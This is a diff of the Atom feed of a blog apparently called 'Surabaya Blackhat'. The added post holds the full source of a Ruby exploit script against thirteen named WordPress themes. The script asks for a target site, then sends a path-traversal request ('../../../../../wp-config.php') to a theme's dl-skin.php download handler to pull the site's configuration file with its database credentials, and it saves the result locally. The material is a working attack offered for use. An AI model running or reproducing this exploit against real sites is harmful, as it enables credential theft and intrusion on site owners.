@@ -4,7 +4,7 @@
   <title><![CDATA[Surabaya Blackhat]]></title>
   <link href="http://blog.surabayablackhat.org/atom.xml" rel="self"/>
   <link href="http://blog.surabayablackhat.org/"/>
-  <updated>2014-08-26T22:14:42+07:00</updated>
+  <updated>2014-08-26T22:18:10+07:00</updated>
   <id>http://blog.surabayablackhat.org/</id>
   <author>
     <name><![CDATA[SurabayaBlackhat]]></name>
@@ -45,6 +45,216 @@
 <h4>License</h4>
 
 <p><a href="http://www.gnu.org/licenses/agpl-3.0.html">GNU Affero General Public License</a></p>
+
+<h3>Souce</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/ruby
+</span><span class='line'>require 'curb';
+</span><span class='line'>require 'fileutils';
+</span><span class='line'>require 'uri';
+</span><span class='line'>
+</span><span class='line'>#create
+</span><span class='line'>urlInvalid = false;
+</span><span class='line'>themeInvalid = false;
+</span><span class='line'>themeCollection = ["awake","construct","dejavu",
+</span><span class='line'>                  "echelon","elegance","fusion",
+</span><span class='line'>                      "infocus","megastream","method",
+</span><span class='line'>                          "modular","myriad","oakrealty","persuasion"];
+</span><span class='line'>def valid?(url)
+</span><span class='line'>  #url validator
+</span><span class='line'>  uri = URI.parse(url)
+</span><span class='line'>  uri.kind_of?(URI::HTTP)
+</span><span class='line'>rescue URI::InvalidURIError
+</span><span class='line'>  false
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>#coloring
+</span><span class='line'>def colorize(text, color_code)
+</span><span class='line'>  "\e[#{color_code}m#{text}\e[0m"
+</span><span class='line'>end
+</span><span class='line'>#declare the color
+</span><span class='line'>def green(text); colorize(text, 32); end
+</span><span class='line'>def red(text); colorize(text, 31); end
+</span><span class='line'>def yellow(text); colorize(text, 33); end
+</span><span class='line'>def blue(text); colorize(text, 34); end
+</span><span class='line'>def purple(text); colorize(text, 35); end
+</span><span class='line'>def cyan(text); colorize(text, 36); end
+</span><span class='line'>
+</span><span class='line'>#begin step
+</span><span class='line'>puts cyan("//github.com/kampoeng/ruby-AFDFDE") + "    : " + red("ruby-AFDFDE Repository")
+</span><span class='line'>puts cyan("//github.com/SurabayaBlackhat/AFDFDE") + " : " + red("Exploit on Github SBH")
+</span><span class='line'>puts cyan("//fb.com/freeeaks") + "                    : " + purple("Vico Ervanda");
+</span><span class='line'>puts cyan("//fb.com/adiebiazajah") + "                : " + purple("SunDi3yansyah");
+</span><span class='line'>puts cyan("//fb.com/100004896060156") + "             : " + purple("CaFc Versace");
+</span><span class='line'>puts cyan("//kampoeng.co.id") + "                     : " + green("Kampoeng Network") + "\n\n";
+</span><span class='line'>puts green("Theme ID : ");
+</span><span class='line'>for i in 0..12
+</span><span class='line'>  puts purple(i.to_s) + " : " + yellow(themeCollection[i]);
+</span><span class='line'>end
+</span><span class='line'>puts "\n";
+</span><span class='line'>begin
+</span><span class='line'>  #trying to get a valid url
+</span><span class='line'>  if urlInvalid == false
+</span><span class='line'>      puts green("Tolong masukan url yang valid");
+</span><span class='line'>  else
+</span><span class='line'>      puts red("url tidak valid");
+</span><span class='line'>  end
+</span><span class='line'>  urlName = gets.gsub("\n","");
+</span><span class='line'>  if(valid?(urlName) === true)
+</span><span class='line'>      isUrlValid = 0;
+</span><span class='line'>  end;
+</span><span class='line'>  urlInvalid=true;
+</span><span class='line'>end while isUrlValid != 0;
+</span><span class='line'>#url now valid, tell the user
+</span><span class='line'>puts yellow("Situs yang vulnerable adalah : ") + cyan(urlName);
+</span><span class='line'>begin
+</span><span class='line'>  #trying to get theme identifier
+</span><span class='line'>  if themeInvalid == false
+</span><span class='line'>      puts green("Tolong masukan tema yang digunakan");
+</span><span class='line'>      
+</span><span class='line'>  else
+</span><span class='line'>      puts red("tema tidak valid");
+</span><span class='line'>  end
+</span><span class='line'>  themeName = gets.gsub("\n","");
+</span><span class='line'>  if themeName.scan(/([^0-9]+)/).count == 0 and themeName != ""
+</span><span class='line'>      if themeName.to_i &lt; 13 and themeName.to_i > -1
+</span><span class='line'>          isThemeValid = 0;
+</span><span class='line'>      end
+</span><span class='line'>  end
+</span><span class='line'>  themeInvalid = true;
+</span><span class='line'>end while isThemeValid != 0;
+</span><span class='line'>#ok theme is valid, tell the user
+</span><span class='line'>puts yellow("Tema yang terpilih adalah : ") + cyan(themeCollection[themeName.to_i]);
+</span><span class='line'>
+</span><span class='line'>#download the content using post method
+</span><span class='line'>c = Curl.post( urlName + "/wp-content/themes/"+themeCollection[themeName.to_i] + "/lib/scripts/dl-skin.php",{
+</span><span class='line'>                      '_mysite_download_skin' => '../../../../../wp-config.php'
+</span><span class='line'>                      }) do |curl|
+</span><span class='line'>      curl.ssl_verify_peer = false
+</span><span class='line'>      curl.headers["User-Agent"] = "BlackBerry/3.5.0"
+</span><span class='line'>  end
+</span><span class='line'>#assign the result
+</span><span class='line'>text = c.body_str;
+</span><span class='line'>
+</span><span class='line'>#tell the user, what title we use for write to file
+</span><span class='line'>begin 
+</span><span class='line'>  puts green("Please specify a file name (a-zA-Z0-9)");
+</span><span class='line'>  fileName = gets.gsub("\n","");
+</span><span class='line'>  isFileNameValid = fileName.scan(/([^a-zA-Z0-9]+)/).length;
+</span><span class='line'>end while isFileNameValid != 0
+</span><span class='line'>#title ok tell the user
+</span><span class='line'>puts yellow("Judul file yang terpilih adalah : ") + cyan(fileName);
+</span><span class='line'>
+</span><span class='line'>          f = File.open(fileName + ".txt", 'w')
+</span><span class='line'>          f.write(text)
+</span><span class='line'>          f.close
+</span><span class='line'>          puts fileName + ".txt - " + green("Downloaded")
+</span><span class='line'>#end step</span></code></pre></td></tr></table></div></figure>
+
+
+<h4><a href="https://github.com/kampoeng/ruby-AFDFDE">View Project on Github</a></h4>
 ]]></content>
   </entry>
   
